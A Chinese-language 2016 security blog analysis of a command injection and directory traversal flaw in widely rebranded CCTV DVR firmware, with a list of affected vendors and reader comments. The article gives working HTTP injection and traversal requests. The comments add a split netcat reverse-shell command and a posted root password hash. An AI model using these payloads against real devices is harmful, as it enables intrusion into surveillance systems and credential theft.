<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">某远程代码执行漏洞影响超过70个不同的CCTV-DVR供应商的漏洞分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mickey</a> <span class="bull">·</span> <time title="2016/03/25 10:44" ui-time="" datetime="2016/03/25 10:44" class="published ng-binding ng-isolate-scope">2016/03/25 10:44</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 起因</h1><hr><p>有个老外读了<a href="https://drive.google.com/file/d/0B3tdhdmrVDEwS216aDNXc0JfdTA/view">POINT OF SALE MALWARE: THE FULL STORY OF THE BACKOFF TROJAN OPERATION</a>这篇paper后，对paper里面的数字窃贼先通过入侵CCTV系统识别目标所属的零售商，然后进一步入侵POS机，窃取信用卡帐号比较感兴趣，就去网上找了找了找该CCTV-DVR固件，然后通过分析发现了一个远程代码执行漏洞。然后我看他放出来POC，其实还利用了另一个该固件比较老的漏洞。下面一一说。</p><h1>0x01 漏洞分析</h1><hr><p>通过shodan搜索“Cross Web Server"可以发现大概有18817个设备，其中美国占多数，然后是中国，泰国。这些设备监听81/82端口的居多，另外也有些监听8000端口，</p><p><img alt="p1" img-src="4baa539a86795381a9c5744fb001f7fffbc2e6db.jpg"> 图0</p><p>打开web后的页面如下：</p><p><img alt="p2" img-src="d74fd7e2a6b243e48f51fea45956b048d7387e34.jpg"> 图1</p><p>然后通过查看网页源码找到WebClient.html,在查看WebClient.html源码找到script/live.js,live.js里包含了logo/logo.png</p><p><img alt="p3" img-src="e9247681945b9d64f0b78e4feb92727f7cfc1b5e.jpg"> 图2</p><p>由这个logo知道这是一家销售CCTV系统的以色列公司，但是通过查看网站源码中的注释，发现是中国人写的代码，然后作者去官网下载了固件。固件下载回来是一个zip压缩包，解压后可以看到</p><p><img alt="p4" img-src="e8a99af88150d00847851374effb047c00fc7cf5.jpg"> 图3</p><p>首先查看boot.sh，发现其中执行了另一个bash脚本deps2.sh，这个脚本执行了2个bin文件，分别是XVDRStart.hisi和td3520a，通过他们的文件体积，原文作者首先看了td3520a，td3520a包含了符号表，使分析变得很容易，通过预览了一阵代码，原文作者发现下面有问题的汇编代码</p><p><img alt="p5" img-src="2b5c2cf2c2795b5a78542ad18cd8492d2312f1de.jpg"> 图4</p><p>通过代码可以看出如果<code>/language/[language]/index.html</code>中的<code>[language]</code>目录存在，则解压到<code>[language]</code>，如果不存在，则DVRSsystem最终会执行"<code>tar -zxf /mnt/mtd/WebSites/language.tar.gz %s/* -C /nfsdir/language/</code>",这就导致了命令执行。看到这里想到原来玩CTF遇到/etc/crontab文件中管理员用tar做定期备份的时候，语句写成了<code>tar cfz /home/rene/backup/backup.tar.gz *</code>，引发的问题，原理可以参考<a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">http://www.defensecode.com/public/DefenseCode&#95;Unix&#95;WildCards&#95;Gone&#95;Wild.txt</a></p><p>要想利用还需要克服几个问题</p><ol><li>web服务器不能处理使用空格或换行的URL编码</li><li>命令长度有限制</li></ol><p>可以通过<code>${IFS}</code>克服空格的限制</p><p>通过请求</p><pre><code>#!bash
GET /language/Swedish${IFS}&amp;&amp;echo${IFS}$USER&gt;test&amp;&amp;tar${IFS}/string.js HTTP/1.1
</code></pre><p>来执行查看当前用户的命令，这个HTTP请求会返回404</p><p>要看执行结果，需要利用一个比较老的漏洞递归漏洞来查看结果</p><pre><code>#!bash
GET /../../../../mnt/mtd/test
</code></pre><p><img alt="p6" img-src="d4b0cc504ea1e0c6b2efe43dd0c733f1fea39d8c.jpg"> 图5</p><p>其实如果不用命令执行漏洞来利用的话，也可以通过递归漏洞读取配置文件(/etc/passwd,/config/config.dat等)</p><p><img alt="p7" img-src="662d3abc679873210d8e9ebac93103928e09a981.jpg"> 图6</p><p>POC地址如下：<br><a href="https://github.com/k1p0d/h264_dvr_rce">https://github.com/k1p0d/h264&#95;dvr&#95;rce</a></p><p>这个产品的真正的制造商是深圳的同为数码（<a href="http://www.tvt.net.cn/">http://www.tvt.net.cn/</a>），其他厂商估计是带贴标签的，也就是俗称的OEM（又叫定牌生产和贴牌生产，最早流行于欧美等发达国家，它是国际大公司寻找各自比较优势的一种游戏规则，能降低生产成本，提高品牌附加值）</p><p>受影响的厂商列表：</p><ul><li>Ademco</li><li>ATS Alarmes technolgy and ststems</li><li>Area1Protection</li><li>Avio</li><li>Black Hawk Security</li><li>Capture</li><li>China security systems</li><li>Cocktail Service</li><li>Cpsecured</li><li>CP PLUS</li><li>Digital Eye'z no website</li><li>Diote Service &amp; Consulting</li><li>DVR Kapta</li><li>ELVOX</li><li>ET Vision</li><li>Extra Eye 4 U</li><li>eyemotion</li><li>EDS</li><li>Fujitron</li><li>Full HD 1080p</li><li>Gazer</li><li>Goldeye</li><li>Goldmaster</li><li>Grizzly</li><li>HD IViewer</li><li>Hi-View</li><li>Ipcom</li><li>IPOX</li><li>IR</li><li>ISC Illinois Security Cameras, Inc.</li><li>JFL Alarmes</li><li>Lince</li><li>LOT</li><li>Lux</li><li>Lynx Security</li><li>Magtec</li><li>Meriva Security</li><li>Multistar</li><li>Navaio</li><li>NoVus</li><li>Optivision</li><li>PARA Vision</li><li>Provision-ISR</li><li>Q-See</li><li>Questek</li><li>Retail Solution Inc</li><li>RIT Huston .com</li><li>ROD Security cameras</li><li>Satvision</li><li>Sav Technology</li><li>Skilleye</li><li>Smarteye</li><li>Superior Electrial Systems</li><li>TechShell</li><li>TechSon</li><li>Technomate</li><li>TecVoz</li><li>TeleEye</li><li>Tomura</li><li>truVue</li><li>TVT</li><li>Umbrella</li><li>United Video Security System, Inc</li><li>Universal IT Solutions</li><li>US IT Express</li><li>U-Spy Store</li><li>Ventetian</li><li>V-Gurad Security</li><li>Vid8</li><li>Vtek</li><li>Vision Line</li><li>Visar</li><li>Vodotech.com</li><li>Vook</li><li>Watchman</li><li>Xrplus</li><li>Yansi</li><li>Zetec</li><li>ZoomX</li></ul><h1>0x02 参考文章</h1><hr><ul><li><a href="https://www.exploit-db.com/exploits/29959/">TVT TD-2308SS-B DVR - Directory Traversal Vulnerability</a></li><li><a href="http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html">Remote Code Execution in CCTV-DVR affecting over 70 different vendors</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2016-03-28 11:37:57</span></div><p></p><p>@ADFSEC<br>命令执行有长度限制时,可以分开写<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6f1d00001b2f040e0306">[email&#160;protected]</a>:~# echo nc 127.0.0.1 1234 &gt;e<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f2809d9d86b299939e9b">[email&#160;protected]</a>:~# echo &quot;-e /bin/sh&quot; &gt;&gt;e<br><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0775686873476c666b6e">[email&#160;protected]</a>:~# $(cat e)</p><p>作者都放出POC了。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ADFSEC</span> <span class="reply-time">2016-03-28 11:06:42</span></div><p></p><p>一个有限制的命令注入，需要任意文件读取漏洞来判断有没有执行；命令执行有长度限制，那如何利用呢？作者没讲清楚诶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jye33</span> <span class="reply-time">2016-03-25 21:27:09</span></div><p></p><p>@路人甲 我觉得这个是默认密码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">路人甲</span> <span class="reply-time">2016-03-25 18:54:07</span></div><p></p><p>root:hldf85ln3UUCA:0:0::/root:/bin/sh</p><p>有人破解了吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2016-03-25 18:50:46</span></div><p></p><p>这款CCTV-DVR的认证文件在哪呢？和/etc/passwd无关</p><p></p></div></div></div></div></div></main>